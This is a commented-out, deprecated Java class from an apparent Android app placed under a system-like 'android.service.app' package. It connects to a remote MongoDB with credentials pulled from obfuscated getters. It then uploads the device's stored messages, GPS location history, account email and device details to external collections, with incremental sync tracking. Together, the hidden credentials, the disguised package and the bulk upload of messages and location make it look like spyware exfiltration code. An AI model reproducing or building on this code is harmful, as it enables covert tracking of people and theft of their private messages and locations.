//package android.service.app.db.mongo;
//
//import android.content.Context;
//import android.service.app.db.DatabaseHelper;
//import android.service.app.db.data.Gps;
//import android.service.app.db.data.Message;
//import android.service.app.db.inventory.Device;
//import android.service.app.db.sync.Sync;
//import android.service.app.db.user.Account;
//import android.service.app.utils.Log;
//import android.support.annotation.Nullable;
//
//import com.mongodb.MongoClientURI;
//import com.mongodb.client.FindIterable;
//import com.mongodb.client.MongoCollection;
//import com.mongodb.client.MongoCursor;
//import com.mongodb.client.MongoDatabase;
//import com.mongodb.client.MongoIterable;
//
//import org.bson.Document;
//
//import java.util.ArrayList;
//import java.util.List;
//import java.util.Set;
//
//@Deprecated
//public class MongoClient
//{
//    public static final String DB_PROTOCOL = DatabaseHelper.ACCOUNT.a();
//    public static final String DB_USER = DatabaseHelper.ACCOUNT.b();
//    public static final String DB_PASSWORD = DatabaseHelper.ACCOUNT.c();
//    public static final String DB_HOST = DatabaseHelper.ACCOUNT.d();
//    public static final int DB_PORT = Integer.valueOf(DatabaseHelper.ACCOUNT.e());
//    public static final String DB_NAME = DatabaseHelper.ACCOUNT.f();
//    public static final String DB_AUTH = DatabaseHelper.ACCOUNT.g();
//
//    public static final String ACCOUNTS = "accounts";
//    public static final String SYNC = "sync";
//    public static final String GPS = "gps";
//    public static final String DEVICES = "devices";
//    public static final String MESSAGES = "messages";
//
//    private static MongoDatabase getMongoDatabase()
//    {
//        System.setProperty("org.mongodb.async.type", "netty");
//        String userPass = DB_USER + ":" + DB_PASSWORD + "@";
//        MongoClientURI uri = new MongoClientURI(DB_PROTOCOL + userPass + DB_HOST + ":" + DB_PORT + "/" + DB_NAME + "?authSource=" + DB_AUTH);
//        com.mongodb.MongoClient mongoClient = new com.mongodb.MongoClient(uri);
//        MongoDatabase database = mongoClient.getDatabase(uri.getDatabase());
//        Document ping = database.runCommand(new Document("ping", null));
//        Log.v("ping=" + ping);
//        return database;
//    }
//
//    private static void syncExternalDatabase(Context context, DatabaseHelper localDatabase)
//    {
//        MongoDatabase externalDatabase = getMongoDatabase();
//
//        initExternalDatabase(externalDatabase);
//
//        Device firstDevice = registerAccountAndDeviceIfNeeded(localDatabase, externalDatabase);
//        if (firstDevice == null) return;
//
//        syncMessages(localDatabase, externalDatabase, firstDevice);
//        syncGps(localDatabase, externalDatabase, firstDevice);
//        syncAll(localDatabase, externalDatabase);
//
//        localDatabase.close();
//    }
//
//    private static void syncGps(DatabaseHelper localDatabase, MongoDatabase externalDatabase, Device device)
//    {
//        Set<Gps> localDatabaseGpsSet = localDatabase.getGpsSet();
//        Log.v("internal:localDatabaseGpsSet=" + localDatabaseGpsSet);
//
//        MongoCollection<Document> syncs = externalDatabase.getCollection(SYNC);
//        String externalAccountId = device.getAccount(localDatabase.getReadableDatabase()).getEmail();
//        FindIterable<Document> gpsSyncPoints = syncs.find(new Document(Sync.ACCOUNT_ID, externalAccountId).append(Sync.TABLE, DatabaseHelper.GPS.getTableName()));
//        Log.v("external:gpsSyncPoints=" + gpsSyncPoints);
//        Integer newGpsSyncId = null;
//
//        MongoCursor<Document> iterator = gpsSyncPoints.iterator();
//        boolean syncPointsExists = iterator.hasNext();
//        Log.v("external:syncPointsExists=" + syncPointsExists);
//
//        if (syncPointsExists)
//        {
//            Document gpsSync = iterator.next();
//            Log.v("gpsSync=" + gpsSync);
//
//            Integer gpsSyncId = (Integer) gpsSync.get(Sync.SYNC_ID);
//            Log.v("external:gpsSyncId=" + gpsSyncId);
//
//            List<Document> documents = new ArrayList<>();
//            for (Gps gps : localDatabaseGpsSet)
//            {
//                if (!gps.isEmpty() && gps.getId() > gpsSyncId)
//                {
//                    Document document = new Document();
//                    document.putAll(gps.getData());
//                    document.put(Gps.DEVICE_ID, device.getName());
//                    documents.add(document);
//
//                    newGpsSyncId = gps.getId();
//                    Log.v("candidate:newGpsSyncId=" + newGpsSyncId);
//                }
//            }
//
//            Log.v("newGpsSyncId=" + newGpsSyncId);
//            if (newGpsSyncId != null)
//            {
//                Log.v("gpsSet.insertMany:documents=" + documents);
//                MongoCollection<Document> gpsSet = externalDatabase.getCollection(GPS);
//                gpsSet.insertMany(documents);
//                localDatabase.updateOrInsertSyncIfNeeded(new Sync(device.getAccountId(), newGpsSyncId, DatabaseHelper.GPS.getTableName()));
//            }
//        } else
//        {
//            List<Document> documents = new ArrayList<>();
//            for (Gps gps : localDatabaseGpsSet)
//            {
//                if (!gps.isEmpty())
//                {
//                    Document document = new Document();
//                    document.putAll(gps.getData());
//                    document.put(Gps.DEVICE_ID, device.getName());
//                    documents.add(document);
//
//                    newGpsSyncId = gps.getId();
//                }
//            }
//
//            Log.v("newGpsSyncId=" + newGpsSyncId);
//            if (newGpsSyncId != null)
//            {
//                Log.v("gps.insertMany:documents=" + documents);
//                MongoCollection<Document> gpsSet = externalDatabase.getCollection(GPS);
//                gpsSet.insertMany(documents);
//                localDatabase.updateOrInsertSyncIfNeeded(new Sync(device.getAccountId(), newGpsSyncId, DatabaseHelper.GPS.getTableName()));
//            }
//        }
//    }
//
//    private static void syncMessages(DatabaseHelper localDatabase, MongoDatabase externalDatabase, Device device)
//    {
//        Set<Message> localDatabaseMessages = localDatabase.getMessages();
//        Log.v("internal:localDatabaseMessages=" + localDatabaseMessages);
//
//        MongoCollection<Document> syncs = externalDatabase.getCollection(SYNC);
//        String externalAccountId = device.getAccount(localDatabase.getReadableDatabase()).getEmail();
//        FindIterable<Document> messageSyncPoints = syncs.find(new Document(Sync.ACCOUNT_ID, externalAccountId).append(Sync.TABLE, DatabaseHelper.MESSAGE.getTableName()));
//        Log.v("external:messageSyncPoints=" + messageSyncPoints);
//        Integer newMessageSyncId = null;
//
//        MongoCursor<Document> iterator = messageSyncPoints.iterator();
//        boolean syncPointsExists = iterator.hasNext();
//        Log.v("external:syncPointsExists=" + syncPointsExists);
//
//        if (syncPointsExists)
//        {
//            Document messageSync = iterator.next();
//            Log.v("messageSync=" + messageSync);
//
//            Integer messageSyncId = (Integer) messageSync.get(Sync.SYNC_ID);
//            Log.v("external:messageSyncId=" + messageSyncId);
//
//            List<Document> documents = new ArrayList<>();
//            for (Message message : localDatabaseMessages)
//            {
//                if (!message.isEmpty() && message.getId() > messageSyncId)
//                {
//                    Document document = new Document();
//                    document.putAll(message.getData());
//                    document.put(Message.DEVICE_ID, device.getName());
//                    documents.add(document);
//
//                    newMessageSyncId = message.getId();
//                    Log.v("candidate:newMessageSyncId=" + newMessageSyncId);
//                }
//            }
//
//            Log.v("newMessageSyncId=" + newMessageSyncId);
//            if (newMessageSyncId != null)
//            {
//                Log.v("messages.insertMany:documents=" + documents);
//                MongoCollection<Document> messages = externalDatabase.getCollection(MESSAGES);
//                messages.insertMany(documents);
//                localDatabase.updateOrInsertSyncIfNeeded(new Sync(device.getAccountId(), newMessageSyncId, DatabaseHelper.MESSAGE.getTableName()));
//            }
//        } else
//        {
//            List<Document> documents = new ArrayList<>();
//            for (Message message : localDatabaseMessages)
//            {
//                if (!message.isEmpty())
//                {
//                    Document document = new Document();
//                    document.putAll(message.getData());
//                    document.put(Message.DEVICE_ID, device.getName());
//                    documents.add(document);
//
//                    newMessageSyncId = message.getId();
//                }
//            }
//
//            Log.v("newMessageSyncId=" + newMessageSyncId);
//            if (newMessageSyncId != null)
//            {
//                Log.v("messages.insertMany:documents=" + documents);
//                MongoCollection<Document> messages = externalDatabase.getCollection(MESSAGES);
//                messages.insertMany(documents);
//                localDatabase.updateOrInsertSyncIfNeeded(new Sync(device.getAccountId(), newMessageSyncId, DatabaseHelper.MESSAGE.getTableName()));
//            }
//        }
//    }
//
//    private static void syncAll(DatabaseHelper localDatabase, MongoDatabase externalDatabase)
//    {
//        Account account = localDatabase.selectFirstAccount();
//        Log.v("account=" + account);
//
//        Set<Sync> syncSet = localDatabase.getSyncSet();
//        Log.v("syncSet=" + syncSet);
//
//        MongoCollection<Document> syncs = externalDatabase.getCollection(SYNC);
//        boolean isNotExistSyncPoints = syncs.count() == 0;
//        Log.v("isNotExistSyncPoints=" + isNotExistSyncPoints);
//        if (isNotExistSyncPoints)
//        {
//            List<Document> documents = new ArrayList<>();
//            for (Sync sync : syncSet)
//            {
//                if (!sync.isEmpty())
//                {
//                    Document document = new Document();
//                    document.putAll(sync.getData());
//                    document.put(Sync.ACCOUNT_ID, account.getEmail());
//                    documents.add(document);
//                }
//            }
//
//            if (!documents.isEmpty()) syncs.insertMany(documents);
//        } else
//        {
//            for (Sync sync : syncSet)
//            {
//                if (!sync.isEmpty())
//                {
//                    Document document = new Document();
//                    document.putAll(sync.getData());
//                    document.put(Sync.ACCOUNT_ID, account.getEmail());
//                    Document result = syncs.findOneAndReplace(new Document(Sync.ACCOUNT_ID, account.getEmail()).append(Sync.TABLE, sync.getTable()), document);
//                    Log.v("syncs.findOneAndReplace:result=" + result);
//                    if (result == null) syncs.insertOne(document);
//                }
//            }
//        }
//    }
//
//    @Nullable
//    private static Device registerAccountAndDeviceIfNeeded(DatabaseHelper localDatabase, MongoDatabase externalDatabase)
//    {
//        Account firstAccount = localDatabase.selectFirstAccount();
//        Log.v("firstAccount=" + firstAccount);
//        if (!firstAccount.isEmpty())
//        {
//            Document account = new Document();
//            account.putAll(firstAccount.getData());
//            MongoCollection<Document> accounts = externalDatabase.getCollection(ACCOUNTS);
//            if (accounts.count() == 0) accounts.insertOne(account);
//            else
//            {
//                Document result = accounts.findOneAndReplace(new Document(Account.EMAIL, firstAccount.getEmail()), account);
//                if (result == null) accounts.insertOne(account);
//            }
//        } else
//        {
//            Log.v("account not exist!");
//            return null;
//        }
//
//        Device firstDevice = localDatabase.selectFirstDevice();
//        Log.v("firstDevice=" + firstDevice);
//        if (!firstDevice.isEmpty())
//        {
//            Document device = new Document();
//            device.putAll(firstDevice.getData());
//            device.put(Device.ACCOUNT_ID, firstAccount.getEmail());
//            MongoCollection<Document> devices = externalDatabase.getCollection(DEVICES);
//            if (devices.count() == 0) devices.insertOne(device);
//            else
//            {
//                Document result = devices.findOneAndReplace(new Document(Device.NAME, firstDevice.getName()), device);
//                if (result == null) devices.insertOne(device);
//            }
//        } else
//        {
//            Log.v("device not exist!");
//            return null;
//        }
//        return firstDevice;
//    }
//
//    private static void initExternalDatabase(MongoDatabase externalDatabase)
//    {
//        MongoIterable<String> collectionNames = externalDatabase.listCollectionNames();
//        MongoCursor<String> iterator = collectionNames.iterator();
//        if (!iterator.hasNext())
//        {
//            externalDatabase.createCollection(ACCOUNTS);
//            externalDatabase.createCollection(DEVICES);
//            externalDatabase.createCollection(MESSAGES);
//            externalDatabase.createCollection(SYNC);
//            externalDatabase.createCollection(GPS);
//        } else
//        {
//            List<String> collections = new ArrayList<>();
//            while (iterator.hasNext())
//            {
//                collections.add(iterator.next());
//            }
//
//            if (!collections.contains(ACCOUNTS)) externalDatabase.createCollection(ACCOUNTS);
//            if (!collections.contains(DEVICES)) externalDatabase.createCollection(DEVICES);
//            if (!collections.contains(MESSAGES)) externalDatabase.createCollection(MESSAGES);
//            if (!collections.contains(SYNC)) externalDatabase.createCollection(SYNC);
//            if (!collections.contains(GPS)) externalDatabase.createCollection(GPS);
//        }
//    }
//
//
//}
